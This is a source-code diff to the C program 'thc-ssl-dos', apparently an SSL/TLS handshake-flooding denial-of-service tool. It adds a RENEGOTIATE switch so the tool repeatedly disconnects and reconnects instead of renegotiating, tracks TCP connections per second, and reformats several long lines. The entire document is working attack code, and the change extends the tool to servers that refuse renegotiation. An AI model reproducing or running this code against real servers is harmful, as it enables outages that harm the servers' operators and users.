@@ -9,6 +9,7 @@
 #define DEFAULT_PEERS		(400)
 #define PROGRAM_NAME		"thc-ssl-dos"
 #define TO_TCP_CONNECT		(10)	/* 10 second TCP connect() timeout */
+#define RENEGOTIATE		(0)
 
 
 struct _statistics
@@ -18,6 +19,7 @@ struct _statistics
 	uint32_t total_ssl_connect;
 	uint32_t error_count;
 	uint64_t epoch_start_usec;
+	uint32_t epoch_start_tcp_connections;
 	uint32_t epoch_start_renegotiations;
 };
 
@@ -430,7 +432,10 @@ NextState(struct _peer *p)
 		PEER_SSL_dummywrite(p);
 		break;
 	case STATE_SSL_HANDSHAKING:
-		PEER_SSL_renegotiate(p);
+		if (RENEGOTIATE)
+			PEER_SSL_renegotiate(p);
+		else
+			PEER_disconnect(p);
 		break;
 	default:
 		DEBUGF("NextState(): unknown state: %d\n", p->state);
@@ -524,7 +529,9 @@ tcp_connect_try_finish(struct _peer *p, int ret)
 		{
 			if (g_opt.stat.total_tcp_connections <= 0)
 			{
-				fprintf(stderr, "TCP connect(%s:%d): %s\n", int_ntoa(g_opt.ip), ntohs(g_opt.port), strerror(errno));
+				fprintf(stderr, "TCP connect(%s:%d): %s\n",
+				        int_ntoa(g_opt.ip), ntohs(g_opt.port),
+				        strerror(errno));
 				exit(-1);
 
 			}
@@ -627,13 +634,21 @@ PEER_disconnect(struct _peer *p)
 static void
 statistics_update(struct timeval *tv)
 {
-	int32_t reneg_delta;
+	uint32_t delta, *total, *epoch;
 	uint32_t usec_delta;
 	uint64_t usec_now;
 	int32_t conn = 0;
 	int i;
 
-	reneg_delta = g_opt.stat.total_renegotiations - g_opt.stat.epoch_start_renegotiations;
+	if (RENEGOTIATE)
+	{
+		total = &g_opt.stat.total_renegotiations;
+		epoch = &g_opt.stat.epoch_start_renegotiations;
+	} else {
+		total = &g_opt.stat.total_tcp_connections;
+		epoch = &g_opt.stat.epoch_start_tcp_connections;
+	}
+	delta = *total - *epoch;
 	usec_now = getusec(tv);
 	usec_delta = usec_now - g_opt.stat.epoch_start_usec;
 
@@ -644,9 +659,11 @@ statistics_update(struct timeval *tv)
 		if (peers[i].state > STATE_TCP_CONNECTING)
 			conn++;
 	}
-	printf("Handshakes %" PRIu32" [%.2f h/s], %" PRId32 " Conn, %" PRIu32 " Err\n", g_opt.stat.total_renegotiations, (float)(1000000 * reneg_delta) / usec_delta, conn, g_opt.stat.error_count);
+	printf("Handshakes %" PRIu32" [%.2f h/s], %" PRId32 " Conn, %" PRIu32 " Err\n",
+	       *total, (float)(1000000 * delta) / usec_delta, conn,
+	       g_opt.stat.error_count);
 
-	g_opt.stat.epoch_start_renegotiations = g_opt.stat.total_renegotiations;
+	*epoch = *total;
 	g_opt.stat.epoch_start_usec = usec_now;
 }
 
@@ -709,7 +726,8 @@ printf("     ______________ ___  _________\n"
 		int end = g_opt.n_peers;
 		for (i = 0; i < end; i++)
 		{
-			if ((peers[i].state == STATE_TCP_CONNECTING) && (peers[i].tv_connect_sec + TO_TCP_CONNECT < tv.tv_sec))
+			if ((peers[i].state == STATE_TCP_CONNECTING)
+			    && (peers[i].tv_connect_sec + TO_TCP_CONNECT < tv.tv_sec))
 			{
 				fprintf(stderr, "#%d Connection timed out\n", i);
 				PEER_disconnect(&peers[i]);
